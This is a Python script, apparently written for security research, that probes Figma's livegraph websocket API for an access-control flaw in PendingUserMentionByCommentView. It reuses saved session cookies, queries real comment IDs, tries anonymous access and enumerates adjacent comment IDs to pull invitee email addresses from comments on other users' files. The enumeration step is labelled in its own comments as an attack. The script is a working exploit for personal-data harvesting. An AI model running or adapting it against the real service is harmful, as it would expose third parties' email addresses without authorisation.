# -*- coding: utf-8 -*-
"""对照判定: PendingUserMentionByCommentView (仅 fileCommentId 参数, 返回 inviteeEmail)
攻击假设: 无 fileKey 上下文 -> resolver 无法校验调用者对该评论的权限
  若真实评论 ID 返回 mentions, 且相邻 ID(属于其他文件)也能返回 -> 枚举任意文件评论提及 = PII 泄露
"""
import sys, json, io, asyncio, time, urllib.parse, uuid, re
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
import websockets

B_UID = "1667396392129259941"
A_UID = "1666382703778278399"
A_MAKE = "5zb5YkoxMa09KpqOyuLcHD"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"

REAL_IDS = ["523547366", "524652169", "527176705", "530201646", "532926446", "536923685", "540470734", "540749470"]


def make_abs_pure(cookie, keep_uid):
    parts = {}
    for p in cookie.split("; "):
        if "=" in p:
            k, v = p.split("=", 1)
            parts[k] = v
    d = json.loads(urllib.parse.unquote(parts.get("__Host-figma.authn", "")))
    d = {k: v for k, v in d.items() if k == keep_uid}
    parts["__Host-figma.authn"] = urllib.parse.quote(json.dumps(d, separators=(",", ":")))
    if "__Host-figma.embed" in parts:
        try:
            ne = json.loads(urllib.parse.unquote(parts["__Host-figma.embed"]))
            ne = {k: v for k, v in ne.items() if k == keep_uid}
            if ne:
                parts["__Host-figma.embed"] = urllib.parse.quote(json.dumps(ne, separators=(",", ":")))
            else:
                del parts["__Host-figma.embed"]
                parts.pop("__Host-figma.embed.mac", None)
        except Exception:
            pass
    return "; ".join(f"{k}={v}" for k, v in parts.items())


rawB = io.open("ws_cookie_B_new.txt", encoding="utf-8").read().strip().replace("\n", "; ")
ABS_B = make_abs_pure(rawB, B_UID)

OUT = io.open("_ws_mention_probe_out.txt", "w", encoding="utf-8")


def lg_url(fk, uid):
    return (f"wss://www.figma.com/api/livegraph?pv=1&pr=251c5be83e6853e5&pt=1786072093"
            f"&ph=sb9dUg8LQV0WGY29b-j8nggmhGX8TR2vghWs-rNzbds&userId={uid}&anonUserId="
            f"&clientType=web&commitHash=5848603c50c1ee154ea6a1fe5ee3aab3791c5b48"
            f"&preload=%7B%7D&requestedProtocolVersion=2"
            f"&clientUrl=https%3A%2F%2Fwww.figma.com%2Ffile%2F{fk}"
            f"&connectionType=initial&reconnect=0")


async def sub(view, args, fk, uid, ck, wait=9):
    frames = []
    try:
        async with websockets.connect(lg_url(fk, uid),
                                      additional_headers={"User-Agent": UA, "Cookie": ck,
                                                          "Origin": "https://www.figma.com"},
                                      max_size=50_000_000, open_timeout=30) as ws:
            await ws.send(json.dumps({"messageType": "auth", "clientType": "web",
                                      "args": {"userId": uid, "anonymousUserId": None},
                                      "tags": {"clientType": "web",
                                               "commitHash": "81855c2bc7c604648169c4e4333f43579bfa7464",
                                               "clientUrl": f"https://www.figma.com/file/{fk}"},
                                      "clientRequestedVersion": 2}))
            for _ in range(3):
                m = await asyncio.wait_for(ws.recv(), timeout=8)
                if isinstance(m, str) and "authSuccess" in m:
                    break
            await ws.send(json.dumps({"messageType": "subscribe", "viewName": view,
                                      "viewHash": "0" * 32, "loadType": "initial",
                                      "args": args}))
            deadline = time.time() + wait
            while time.time() < deadline:
                try:
                    m = await asyncio.wait_for(ws.recv(), timeout=3)
                except asyncio.TimeoutError:
                    continue
                if isinstance(m, str):
                    frames.append(m)
                    if "viewLoaded" in m or "viewSubscriptionFailed" in m:
                        break
    except Exception as e:
        return [f"ERR {type(e).__name__}: {str(e)[:80]}"]
    return frames


async def run_case(label, view, args, uid, ck, fk=A_MAKE):
    frames = await sub(view, args, fk, uid, ck, wait=8)
    txt = " ".join(frames)
    has_data = any('"initial":{' in f and '"initial":{}' not in f for f in frames)
    emails = set(re.findall(r'"inviteeEmail":"([^"]+)"', txt))
    m = re.search(r'Status code = (\d+). Error message = .*?"message":"([^"]*)"', txt)
    if has_data:
        tag = f"⭐返回数据 emails={emails if emails else '(无email)'}"
    elif m:
        tag = f"⚠{m.group(1)} {m.group(2)[:50]}"
    elif any("error" in f.lower() for f in frames):
        tag = "⚠有错误"
    else:
        tag = "空壳"
    print(f"[{label}] {tag}")
    OUT.write(f"\n===== [{label}] {view} {tag} =====\n")
    for f in frames:
        OUT.write(f"  {f[:2000]}\n")
        if has_data:
            print(f"  🖼 {f[:1200]}")


async def main():
    v = "PendingUserMentionByCommentView"
    print("=== 1) 真实评论ID (B身份) ===")
    for cid in REAL_IDS:
        await run_case(f"B→评论{cid}", v, {"fileCommentId": cid, "__requestId": str(uuid.uuid4())}, B_UID, ABS_B)
        await asyncio.sleep(0.3)

    print("\n=== 2) 匿名身份 真实评论ID ===")
    for cid in REAL_IDS[:3]:
        await run_case(f"匿名→评论{cid}", v, {"fileCommentId": cid, "__requestId": str(uuid.uuid4())}, "0", "")
        await asyncio.sleep(0.3)

    print("\n=== 3) 相邻ID枚举 (攻击: 其他文件的评论) ===")
    # 523547366 前后 + 530201646 前后 + 540749470 前后 (跨文件命中概率)
    for cid in [str(x) for x in range(523547360, 523547371)]:
        await run_case(f"B→{cid}", v, {"fileCommentId": cid, "__requestId": str(uuid.uuid4())}, B_UID, ABS_B)
        await asyncio.sleep(0.2)
    for cid in [str(x) for x in range(530201640, 530201651)]:
        await run_case(f"B→{cid}", v, {"fileCommentId": cid, "__requestId": str(uuid.uuid4())}, B_UID, ABS_B)
        await asyncio.sleep(0.2)
    for cid in [str(x) for x in range(540749465, 540749476)]:
        await run_case(f"B→{cid}", v, {"fileCommentId": cid, "__requestId": str(uuid.uuid4())}, B_UID, ABS_B)
        await asyncio.sleep(0.2)

    print("\n=== 4) 不存在ID对照 ===")
    await run_case("B→999999999999", v, {"fileCommentId": "999999999999", "__requestId": str(uuid.uuid4())}, B_UID, ABS_B)

    OUT.close()
    print("\nDONE")


asyncio.run(main())
